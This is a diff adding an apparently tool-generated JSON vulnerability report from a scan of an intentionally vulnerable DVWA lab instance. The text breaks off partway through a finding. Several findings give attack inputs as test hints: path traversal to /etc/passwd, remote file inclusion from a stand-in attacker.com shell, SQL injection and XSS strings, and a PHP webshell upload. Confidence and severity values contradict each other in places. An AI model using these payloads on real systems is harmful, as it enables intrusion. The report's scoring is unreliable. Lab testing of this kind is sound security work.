@@ -1,0 +1,1166 @@
+{
+  "report_id": "WEB-BCE1652A126A",
+  "schema_version": "1.0",
+  "generated_at": "2026-05-19 20:10:44 UTC",
+  "framework": "AI Red Team Harness v3",
+  "report_type": "Web Application Vulnerability Assessment",
+  "session_id": "9669cc80",
+  "target_url": "http://192.168.0.102/dvwa",
+  "scan_started_at": "2026-05-19T20:10:15.629086+00:00",
+  "scan_ended_at": "2026-05-19T20:10:44.779342+00:00",
+  "executive_summary": "A Web Application Vulnerability Assessment was conducted against `http://192.168.0.102/dvwa` using AI Red Team Harness v3. The scan completed in 29 seconds and examined 2 URL(s), 1 form(s), and 0 parameter(s).\n\n**Overall Risk Rating: CRITICAL** (score 100.0/100)\n\nThe assessment identified **22 finding(s)**: 2 CRITICAL, 6 HIGH, 4 MEDIUM, 9 LOW, 1 INFO.\n\n**Critical issues requiring immediate attention:**\n- DVWA Module Accessible — fi\n- DVWA Module Accessible — upload",
+  "risk_summary": {
+    "total_findings": 22,
+    "critical": 2,
+    "high": 6,
+    "medium": 4,
+    "low": 9,
+    "info": 1,
+    "risk_score": 100.0,
+    "risk_label": "CRITICAL",
+    "top_owasp": [
+      {
+        "category": "A05:2021 – Security Misconfiguration",
+        "count": 10
+      },
+      {
+        "category": "A01:2021 — Broken Access Control",
+        "count": 6
+      },
+      {
+        "category": "A07:2021 – Identification and Authentication Failures",
+        "count": 3
+      },
+      {
+        "category": "A02:2021 – Cryptographic Failures",
+        "count": 1
+      },
+      {
+        "category": "A03:2021 – Injection",
+        "count": 1
+      }
+    ],
+    "top_cwe": [
+      {
+        "cwe": "CWE-1035",
+        "count": 6
+      },
+      {
+        "cwe": "CWE-693",
+        "count": 5
+      },
+      {
+        "cwe": "CWE-215",
+        "count": 3
+      },
+      {
+        "cwe": "CWE-287",
+        "count": 3
+      },
+      {
+        "cwe": "CWE-538",
+        "count": 2
+      }
+    ],
+    "by_category": {
+      "CWE-326": 1,
+      "CWE-215": 3,
+      "CWE-79": 1,
+      "CWE-693": 5,
+      "CWE-287": 3,
+      "CWE-352": 1,
+      "CWE-538": 2,
+      "CWE-1035": 6
+    },
+    "scan_duration_s": 29.15,
+    "urls_scanned": 2,
+    "forms_tested": 1,
+    "parameters_tested": 0
+  },
+  "findings": [
+    {
+      "id": "DVWA-241969B6",
+      "title": "DVWA Module Accessible — upload",
+      "severity": "CRITICAL",
+      "confidence": 0.9,
+      "confidence_pct": 90,
+      "cvss_score": 9.8,
+      "validation_status": "confirmed",
+      "exploit_status": "CONFIRMED",
+      "comparison_result": "DVWA module at /vulnerabilities/upload/ returned HTTP 200. Authenticated: True. Module is active and ready for testing.",
+      "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/upload/",
+      "parameter": "",
+      "description": "DVWA File Upload module is accessible. Upload a PHP webshell with .php extension to achieve RCE.",
+      "evidence": "HTTP 200 for http://192.168.0.102/dvwa/vulnerabilities/upload/. DVWA session active: True",
+      "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks.",
+      "cwe": "CWE-1035",
+      "owasp": "A01:2021 — Broken Access Control",
+      "references": [
+        "https://dvwa.co.uk/",
+        "https://github.com/digininja/DVWA"
+      ],
+      "timestamp": 1779221444.7739384,
+      "module": "dvwa_file_upload",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to http://192.168.0.102/dvwa/vulnerabilities/upload/",
+        "2. Set DVWA Security Level to Low in /security.php",
+        "3. DVWA File Upload module is accessible. Upload a PHP webshell with .php extension to achieve RCE."
+      ],
+      "validation_logic": "DVWA-specific module detected and accessible. DVWA modules are designed to be exploitable — treat all findings as CONFIRMED in the context of authorized lab testing.",
+      "fp_checks_performed": [],
+      "exploitability": "DVWA File Upload module is accessible. Upload a PHP webshell with .php extension to achieve RCE."
+    },
+    {
+      "id": "DVWA-9D1EE6E3",
+      "title": "DVWA Module Accessible — fi",
+      "severity": "CRITICAL",
+      "confidence": 0.9,
+      "confidence_pct": 90,
+      "cvss_score": 9.0,
+      "validation_status": "confirmed",
+      "exploit_status": "CONFIRMED",
+      "comparison_result": "DVWA module at /vulnerabilities/fi/ returned HTTP 200. Authenticated: True. Module is active and ready for testing.",
+      "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/fi/",
+      "parameter": "",
+      "description": "DVWA File Inclusion module is accessible. Test: ?page=../../etc/passwd (LFI) and ?page=http://attacker.com/shell.txt (RFI).",
+      "evidence": "HTTP 200 for http://192.168.0.102/dvwa/vulnerabilities/fi/. DVWA session active: True",
+      "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks.",
+      "cwe": "CWE-1035",
+      "owasp": "A01:2021 — Broken Access Control",
+      "references": [
+        "https://dvwa.co.uk/",
+        "https://github.com/digininja/DVWA"
+      ],
+      "timestamp": 1779221444.664991,
+      "module": "dvwa_lfi",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to http://192.168.0.102/dvwa/vulnerabilities/fi/",
+        "2. Set DVWA Security Level to Low in /security.php",
+        "3. DVWA File Inclusion module is accessible. Test: ?page=../../etc/passwd (LFI) and ?page=http://attacker.com/shell.txt (RFI)."
+      ],
+      "validation_logic": "DVWA-specific module detected and accessible. DVWA modules are designed to be exploitable — treat all findings as CONFIRMED in the context of authorized lab testing.",
+      "fp_checks_performed": [],
+      "exploitability": "DVWA File Inclusion module is accessible. Test: ?page=../../etc/passwd (LFI) and ?page=http://attacker.com/shell.txt (RFI)."
+    },
+    {
+      "id": "DVWA-A05A8C24",
+      "title": "DVWA Module Accessible — sqli",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "confidence_pct": 90,
+      "cvss_score": 8.8,
+      "validation_status": "confirmed",
+      "exploit_status": "CONFIRMED",
+      "comparison_result": "DVWA module at /vulnerabilities/sqli/ returned HTTP 200. Authenticated: True. Module is active and ready for testing.",
+      "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/sqli/",
+      "parameter": "",
+      "description": "DVWA SQL Injection module is accessible. Submit 1' OR '1'='1 or 1 UNION SELECT 1,2-- in the ID field.",
+      "evidence": "HTTP 200 for http://192.168.0.102/dvwa/vulnerabilities/sqli/. DVWA session active: True",
+      "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks.",
+      "cwe": "CWE-1035",
+      "owasp": "A01:2021 — Broken Access Control",
+      "references": [
+        "https://dvwa.co.uk/",
+        "https://github.com/digininja/DVWA"
+      ],
+      "timestamp": 1779221444.279071,
+      "module": "dvwa_sqli",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to http://192.168.0.102/dvwa/vulnerabilities/sqli/",
+        "2. Set DVWA Security Level to Low in /security.php",
+        "3. DVWA SQL Injection module is accessible. Submit 1' OR '1'='1 or 1 UNION SELECT 1,2-- in the ID field."
+      ],
+      "validation_logic": "DVWA-specific module detected and accessible. DVWA modules are designed to be exploitable — treat all findings as CONFIRMED in the context of authorized lab testing.",
+      "fp_checks_performed": [],
+      "exploitability": "DVWA SQL Injection module is accessible. Submit 1' OR '1'='1 or 1 UNION SELECT 1,2-- in the ID field."
+    },
+    {
+      "id": "WEB-BC677822",
+      "title": "Application Served Over HTTP (No TLS)",
+      "severity": "HIGH",
+      "confidence": 1.0,
+      "confidence_pct": 100,
+      "cvss_score": 7.5,
+      "validation_status": "confirmed",
+      "exploit_status": "CONFIRMED",
+      "comparison_result": "Engine detection: URL scheme is 'http': http://192.168.0.102/dvwa",
+      "endpoint": "http://192.168.0.102/dvwa",
+      "parameter": "",
+      "description": "The application is served over plain HTTP. All traffic (including credentials and session tokens) is transmitted in cleartext.",
+      "evidence": "URL scheme is 'http': http://192.168.0.102/dvwa",
+      "remediation": "Enforce HTTPS for all endpoints. Obtain a TLS certificate and redirect all HTTP traffic to HTTPS. Configure HSTS.",
+      "cwe": "CWE-326",
+      "owasp": "A02:2021 – Cryptographic Failures",
+      "references": [
+        "https://owasp.org/www-community/vulnerabilities/Insecure_Transport",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html"
+      ],
+      "timestamp": 1779221416.2541165,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa",
+        "2. Identify parameter: ",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: URL scheme is 'http': http://192.168.0.102/dvwa",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Application Served Over HTTP (No TLS)"
+      ],
+      "validation_logic": "Confidence 100% based on engine detection. Evidence: URL scheme is 'http': http://192.168.0.102/dvwa",
+      "fp_checks_performed": [],
+      "exploitability": "Evidence supports exploitability as described."
+    },
+    {
+      "id": "WEB-44825345",
+      "title": "Accessible Admin/Debug Endpoint — /phpinfo",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "confidence_pct": 90,
+      "cvss_score": 7.5,
+      "validation_status": "confirmed",
+      "exploit_status": "CONFIRMED",
+      "comparison_result": "Engine detection: HTTP 200 for http://192.168.0.102/dvwa/phpinfo",
+      "endpoint": "http://192.168.0.102/dvwa/phpinfo",
+      "parameter": "",
+      "description": "Admin/debug endpoint '/phpinfo' returned HTTP 200. It is accessible without authentication.",
+      "evidence": "HTTP 200 for http://192.168.0.102/dvwa/phpinfo",
+      "remediation": "Remove or restrict all debug and admin endpoints in production. Use IP allowlisting or VPN for administrative interfaces. Disable framework debug modes (debug=False, RAILS_ENV=production).",
+      "cwe": "CWE-215",
+      "owasp": "A05:2021 – Security Misconfiguration",
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods"
+      ],
+      "timestamp": 1779221421.4578705,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa/phpinfo",
+        "2. Identify parameter: ",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: HTTP 200 for http://192.168.0.102/dvwa/phpinfo",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Accessible Admin/Debug Endpoint — /phpinfo"
+      ],
+      "validation_logic": "Confidence 90% based on engine detection. Evidence: HTTP 200 for http://192.168.0.102/dvwa/phpinfo",
+      "fp_checks_performed": [],
+      "exploitability": "Evidence supports exploitability as described."
+    },
+    {
+      "id": "WEB-D3B83B49",
+      "title": "Accessible Admin/Debug Endpoint — /docs",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "confidence_pct": 90,
+      "cvss_score": 7.5,
+      "validation_status": "confirmed",
+      "exploit_status": "CONFIRMED",
+      "comparison_result": "Engine detection: HTTP 200 for http://192.168.0.102/dvwa/docs",
+      "endpoint": "http://192.168.0.102/dvwa/docs",
+      "parameter": "",
+      "description": "Admin/debug endpoint '/docs' returned HTTP 200. It is accessible without authentication.",
+      "evidence": "HTTP 200 for http://192.168.0.102/dvwa/docs",
+      "remediation": "Remove or restrict all debug and admin endpoints in production. Use IP allowlisting or VPN for administrative interfaces. Disable framework debug modes (debug=False, RAILS_ENV=production).",
+      "cwe": "CWE-215",
+      "owasp": "A05:2021 – Security Misconfiguration",
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods"
+      ],
+      "timestamp": 1779221438.9579363,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa/docs",
+        "2. Identify parameter: ",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: HTTP 200 for http://192.168.0.102/dvwa/docs",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Accessible Admin/Debug Endpoint — /docs"
+      ],
+      "validation_logic": "Confidence 90% based on engine detection. Evidence: HTTP 200 for http://192.168.0.102/dvwa/docs",
+      "fp_checks_performed": [],
+      "exploitability": "Evidence supports exploitability as described."
+    },
+    {
+      "id": "WEB-719DCC60",
+      "title": "Accessible Admin/Debug Endpoint — /docs/",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "confidence_pct": 90,
+      "cvss_score": 7.5,
+      "validation_status": "confirmed",
+      "exploit_status": "CONFIRMED",
+      "comparison_result": "Engine detection: HTTP 200 for http://192.168.0.102/dvwa/docs/",
+      "endpoint": "http://192.168.0.102/dvwa/docs/",
+      "parameter": "",
+      "description": "Admin/debug endpoint '/docs/' returned HTTP 200. It is accessible without authentication.",
+      "evidence": "HTTP 200 for http://192.168.0.102/dvwa/docs/",
+      "remediation": "Remove or restrict all debug and admin endpoints in production. Use IP allowlisting or VPN for administrative interfaces. Disable framework debug modes (debug=False, RAILS_ENV=production).",
+      "cwe": "CWE-215",
+      "owasp": "A05:2021 – Security Misconfiguration",
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods"
+      ],
+      "timestamp": 1779221439.155965,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa/docs/",
+        "2. Identify parameter: ",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: HTTP 200 for http://192.168.0.102/dvwa/docs/",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Accessible Admin/Debug Endpoint — /docs/"
+      ],
+      "validation_logic": "Confidence 90% based on engine detection. Evidence: HTTP 200 for http://192.168.0.102/dvwa/docs/",
+      "fp_checks_performed": [],
+      "exploitability": "Evidence supports exploitability as described."
+    },
+    {
+      "id": "DVWA-94F6547D",
+      "title": "DVWA Module Accessible — csrf",
+      "severity": "HIGH",
+      "confidence": 0.9,
+      "confidence_pct": 90,
+      "cvss_score": 7.5,
+      "validation_status": "confirmed",
+      "exploit_status": "CONFIRMED",
+      "comparison_result": "DVWA module at /vulnerabilities/csrf/ returned HTTP 200. Authenticated: True. Module is active and ready for testing.",
+      "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/csrf/",
+      "parameter": "",
+      "description": "DVWA CSRF module is accessible. The password-change form can be triggered cross-origin.",
+      "evidence": "HTTP 200 for http://192.168.0.102/dvwa/vulnerabilities/csrf/. DVWA session active: True",
+      "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks.",
+      "cwe": "CWE-1035",
+      "owasp": "A01:2021 — Broken Access Control",
+      "references": [
+        "https://dvwa.co.uk/",
+        "https://github.com/digininja/DVWA"
+      ],
+      "timestamp": 1779221444.5707257,
+      "module": "dvwa_csrf",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to http://192.168.0.102/dvwa/vulnerabilities/csrf/",
+        "2. Set DVWA Security Level to Low in /security.php",
+        "3. DVWA CSRF module is accessible. The password-change form can be triggered cross-origin."
+      ],
+      "validation_logic": "DVWA-specific module detected and accessible. DVWA modules are designed to be exploitable — treat all findings as CONFIRMED in the context of authorized lab testing.",
+      "fp_checks_performed": [],
+      "exploitability": "DVWA CSRF module is accessible. The password-change form can be triggered cross-origin."
+    },
+    {
+      "id": "WEB-DB12D269",
+      "title": "Session Cookie Missing HttpOnly — PHPSESSID",
+      "severity": "MEDIUM",
+      "confidence": 0.95,
+      "confidence_pct": 95,
+      "cvss_score": 5.4,
+      "validation_status": "confirmed",
+      "exploit_status": "CONFIRMED",
+      "comparison_result": "Engine detection: Cookie 'PHPSESSID' HttpOnly=False",
+      "endpoint": "http://192.168.0.102/dvwa",
+      "parameter": "PHPSESSID",
+      "description": "Session-related cookie 'PHPSESSID' lacks the HttpOnly flag, making it readable by JavaScript (XSS risk).",
+      "evidence": "Cookie 'PHPSESSID' HttpOnly=False",
+      "remediation": "Set the HttpOnly flag on all session and authentication cookies.",
+      "cwe": "CWE-287",
+      "owasp": "A07:2021 – Identification and Authentication Failures",
+      "references": [
+        "https://owasp.org/www-community/HttpOnly"
+      ],
+      "timestamp": 1779221416.2536206,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa",
+        "2. Identify parameter: PHPSESSID",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: Cookie 'PHPSESSID' HttpOnly=False",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Session Cookie Missing HttpOnly — PHPSESSID"
+      ],
+      "validation_logic": "Confidence 95% based on engine detection. Evidence: Cookie 'PHPSESSID' HttpOnly=False",
+      "fp_checks_performed": [],
+      "exploitability": "Evidence supports exploitability as described."
+    },
+    {
+      "id": "WEB-939FA5E0",
+      "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing Content-Security-Policy Header",
+      "severity": "MEDIUM",
+      "confidence": 1.0,
+      "confidence_pct": 100,
+      "cvss_score": 5.3,
+      "validation_status": "potential",
+      "exploit_status": "UNVERIFIED",
+      "comparison_result": "Baseline: header '' absent from server response. No exploit demonstrated — classified as configuration gap.",
+      "endpoint": "http://192.168.0.102/dvwa",
+      "parameter": "",
+      "description": "No Content-Security-Policy header is present. CSP provides an important additional layer of defence against XSS.",
+      "evidence": "CSP header absent from server response",
+      "remediation": "Define a strict CSP. Start with default-src 'self'; script-src 'self'; and tighten progressively.",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021 – Injection",
+      "references": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+      ],
+      "timestamp": 1779221416.2496333,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa",
+        "2. Identify parameter: ",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: CSP header absent from server response",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Missing Content-Security-Policy Header"
+      ],
+      "validation_logic": "Per Rule 7: missing security headers are configuration issues, not directly exploitable vulnerabilities. Severity capped unless an exploit chain is demonstrated. Header '' absence represents a legitimate risk and is not downgraded.",
+      "fp_checks_performed": [
+        "header_missing_only_check"
+      ],
+      "exploitability": "Not directly exploitable. Requires additional attacker conditions (e.g., MITM, social engineering, co-located vulnerability) to leverage."
+    },
+    {
+      "id": "WEB-8E4A6745",
+      "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing X-Frame-Options Header",
+      "severity": "MEDIUM",
+      "confidence": 0.98,
+      "confidence_pct": 98,
+      "cvss_score": 4.3,
+      "validation_status": "potential",
+      "exploit_status": "UNVERIFIED",
+      "comparison_result": "Baseline: header 'x-frame-options' absent from server response. No exploit demonstrated — classified as configuration gap.",
+      "endpoint": "http://192.168.0.102/dvwa",
+      "parameter": "x-frame-options",
+      "description": "Absent X-Frame-Options allows the page to be embedded in iframes (clickjacking risk).",
+      "evidence": "Header 'x-frame-options' not present in response",
+      "remediation": "Add: X-Frame-Options: DENY or SAMEORIGIN. Prefer CSP frame-ancestors directive.",
+      "cwe": "CWE-693",
+      "owasp": "A05:2021 – Security Misconfiguration",
+      "references": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"
+      ],
+      "timestamp": 1779221416.2541165,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa",
+        "2. Identify parameter: x-frame-options",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: Header 'x-frame-options' not present in response",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Missing X-Frame-Options Header"
+      ],
+      "validation_logic": "Per Rule 7: missing security headers are configuration issues, not directly exploitable vulnerabilities. Severity capped unless an exploit chain is demonstrated. Header 'x-frame-options' absence represents a legitimate risk and is not downgraded.",
+      "fp_checks_performed": [
+        "header_missing_only_check"
+      ],
+      "exploitability": "Not directly exploitable. Requires additional attacker conditions (e.g., MITM, social engineering, co-located vulnerability) to leverage."
+    },
+    {
+      "id": "WEB-D29BE772",
+      "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing CSRF Token — http://192.168.0.102/login.php",
+      "severity": "MEDIUM",
+      "confidence": 0.5,
+      "confidence_pct": 50,
+      "cvss_score": 4.3,
+      "validation_status": "potential",
+      "exploit_status": "UNVERIFIED",
+      "comparison_result": "Baseline: form inputs present. Observation: no CSRF token field found in ['username', 'password', 'Login']. Exploit requires: tokenless POST succeeds with state change on victim session.",
+      "endpoint": "http://192.168.0.102/login.php",
+      "parameter": "",
+      "description": "A POST form was found without any detectable CSRF token field. UNVERIFIED — confirmation requires a tokenless submission to succeed on a victim session context.",
+      "evidence": "POST form at 'http://192.168.0.102/login.php' has no CSRF token field. Fields: ['username', 'password', 'Login']",
+      "remediation": "Add a cryptographically random CSRF token to every state-changing form. Validate the token server-side on every POST/PUT/DELETE request. Use the SameSite=Strict or SameSite=Lax cookie attribute.",
+      "cwe": "CWE-352",
+      "owasp": "A01:2021 – Broken Access Control",
+      "references": [
+        "https://owasp.org/www-community/attacks/csrf",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+      ],
+      "timestamp": 1779221416.2536206,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/login.php",
+        "2. Identify parameter: ",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: POST form at 'http://192.168.0.102/login.php' has no CSRF token field. Fields: ['username', 'password', 'Login']",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Missing CSRF Token — http://192.168.0.102/login.php"
+      ],
+      "validation_logic": "Confidence 50% based on engine detection. Evidence: POST form at 'http://192.168.0.102/login.php' has no CSRF token field. Fields: ['username', 'password', 'Login']",
+      "fp_checks_performed": [],
+      "exploitability": "Requires manual verification to assess full impact scope."
+    },
+    {
+      "id": "DVWA-31425CB4",
+      "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] DVWA Module Accessible — xss_s",
+      "severity": "LOW",
+      "confidence": 0.9,
+      "confidence_pct": 35,
+      "cvss_score": 8.2,
+      "validation_status": "potential",
+      "exploit_status": "UNVERIFIED",
+      "comparison_result": "DVWA module at /vulnerabilities/xss_s/ returned HTTP 200. Authenticated: True. Module is active and ready for testing.",
+      "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/xss_s/",
+      "parameter": "",
+      "description": "DVWA Stored XSS module is accessible. Store a persistent XSS payload in the message board.",
+      "evidence": "HTTP 200 for http://192.168.0.102/dvwa/vulnerabilities/xss_s/. DVWA session active: True",
+      "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks.",
+      "cwe": "CWE-1035",
+      "owasp": "A01:2021 — Broken Access Control",
+      "references": [
+        "https://dvwa.co.uk/",
+        "https://github.com/digininja/DVWA"
+      ],
+      "timestamp": 1779221444.4808142,
+      "module": "dvwa_xss",
+      "proof_of_concept": "",
+      "raw_request": "GET http://192.168.0.102/dvwa/vulnerabilities/xss_s/?=<PAYLOAD> HTTP/1.1\nHost: (target)\nAccept: text/html\n",
+      "raw_response_excerpt": "HTTP 200 for http://192.168.0.102/dvwa/vulnerabilities/xss_s/. DVWA session active: True",
+      "reproduction_steps": [
+        "1. Send GET/POST to http://192.168.0.102/dvwa/vulnerabilities/xss_s/ with =<img src=x onerror=alert(1)>",
+        "2. Inspect response HTML for unencoded tag.",
+        "3. Load in browser and verify onerror fires before classifying as XSS."
+      ],
+      "validation_logic": "Marker was reflected in the HTML body context. HTML body reflection requires a full tag injection to execute JavaScript. The test marker used (<xssXXX>) does not contain executable JavaScript. Manual testing with a real payload required to confirm execution.",
+      "fp_checks_performed": [
+        "xss_context_analysis",
+        "execution_context: html_body_no_exec_signal"
+      ],
+      "exploitability": "LOW — HTML body reflection. Test with <img src=x onerror=alert(1)> to determine if tags survive server-side sanitisation."
+    },
+    {
+      "id": "DVWA-DEBE6070",
+      "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] DVWA Module Accessible — xss_r",
+      "severity": "LOW",
+      "confidence": 0.9,
+      "confidence_pct": 35,
+      "cvss_score": 7.2,
+      "validation_status": "potential",
+      "exploit_status": "UNVERIFIED",
+      "comparison_result": "DVWA module at /vulnerabilities/xss_r/ returned HTTP 200. Authenticated: True. Module is active and ready for testing.",
+      "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/xss_r/",
+      "parameter": "",
+      "description": "DVWA Reflected XSS module is accessible. Submit <script>alert(1)</script> in the name field.",
+      "evidence": "HTTP 200 for http://192.168.0.102/dvwa/vulnerabilities/xss_r/. DVWA session active: True",
+      "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks.",
+      "cwe": "CWE-1035",
+      "owasp": "A01:2021 — Broken Access Control",
+      "references": [
+        "https://dvwa.co.uk/",
+        "https://github.com/digininja/DVWA"
+      ],
+      "timestamp": 1779221444.3703206,
+      "module": "dvwa_xss",
+      "proof_of_concept": "",
+      "raw_request": "GET http://192.168.0.102/dvwa/vulnerabilities/xss_r/?=<PAYLOAD> HTTP/1.1\nHost: (target)\nAccept: text/html\n",
+      "raw_response_excerpt": "HTTP 200 for http://192.168.0.102/dvwa/vulnerabilities/xss_r/. DVWA session active: True",
+      "reproduction_steps": [
+        "1. Send GET/POST to http://192.168.0.102/dvwa/vulnerabilities/xss_r/ with =<img src=x onerror=alert(1)>",
+        "2. Inspect response HTML for unencoded tag.",
+        "3. Load in browser and verify onerror fires before classifying as XSS."
+      ],
+      "validation_logic": "Marker was reflected in the HTML body context. HTML body reflection requires a full tag injection to execute JavaScript. The test marker used (<xssXXX>) does not contain executable JavaScript. Manual testing with a real payload required to confirm execution.",
+      "fp_checks_performed": [
+        "xss_context_analysis",
+        "execution_context: html_body_no_exec_signal"
+      ],
+      "exploitability": "LOW — HTML body reflection. Test with <img src=x onerror=alert(1)> to determine if tags survive server-side sanitisation."
+    },
+    {
+      "id": "WEB-7323C3DF",
+      "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Sensitive File Exposed — /phpinfo.php",
+      "severity": "LOW",
+      "confidence": 0.6,
+      "confidence_pct": 60,
+      "cvss_score": 3.1,
+      "validation_status": "potential",
+      "exploit_status": "UNVERIFIED",
+      "comparison_result": "Engine detection: HTTP 200 for http://192.168.0.102/dvwa/phpinfo.php. Content: <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"DTD/xhtml1-transitional.d",
+      "endpoint": "http://192.168.0.102/dvwa/phpinfo.php",
+      "parameter": "",
+      "description": "File '/phpinfo.php' returned HTTP 200 but no credentials or secrets were detected in the response. Review manually.",
+      "evidence": "HTTP 200 for http://192.168.0.102/dvwa/phpinfo.php. Content: <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"DTD/xhtml1-transitional.dtd\">\n<html><head>\n<style type=\"text/css\">\nbody {background-color: #ffffff; color: #000000;}\nbody, td, th, h1, h",
+      "remediation": "Block direct access to '/phpinfo.php' via web server configuration. Move sensitive files outside the web root. Audit deployment scripts to prevent secrets from being committed.",
+      "cwe": "CWE-538",
+      "owasp": "A05:2021 – Security Misconfiguration",
+      "references": [
+        "https://owasp.org/www-community/vulnerabilities/Insecure_Direct_Object_Reference"
+      ],
+      "timestamp": 1779221432.463674,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa/phpinfo.php",
+        "2. Identify parameter: ",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: HTTP 200 for http://192.168.0.102/dvwa/phpinfo.php. Content: <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"DTD/xhtml1-transitional.d",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Sensitive File Exposed — /phpinfo.php"
+      ],
+      "validation_logic": "Confidence 60% based on engine detection. Evidence: HTTP 200 for http://192.168.0.102/dvwa/phpinfo.php. Content: <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"DTD/xhtml1-transitional.dtd\">\n<html><head>\n<style type=\"text/css\">\nbody {ba",
+      "fp_checks_performed": [],
+      "exploitability": "Requires manual verification to assess full impact scope."
+    },
+    {
+      "id": "WEB-286FCC60",
+      "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing X-Content-Type-Options Header",
+      "severity": "LOW",
+      "confidence": 0.98,
+      "confidence_pct": 98,
+      "cvss_score": 2.7,
+      "validation_status": "potential",
+      "exploit_status": "UNVERIFIED",
+      "comparison_result": "Baseline: header 'x-content-type-options' absent from server response. No exploit demonstrated — classified as configuration gap.",
+      "endpoint": "http://192.168.0.102/dvwa",
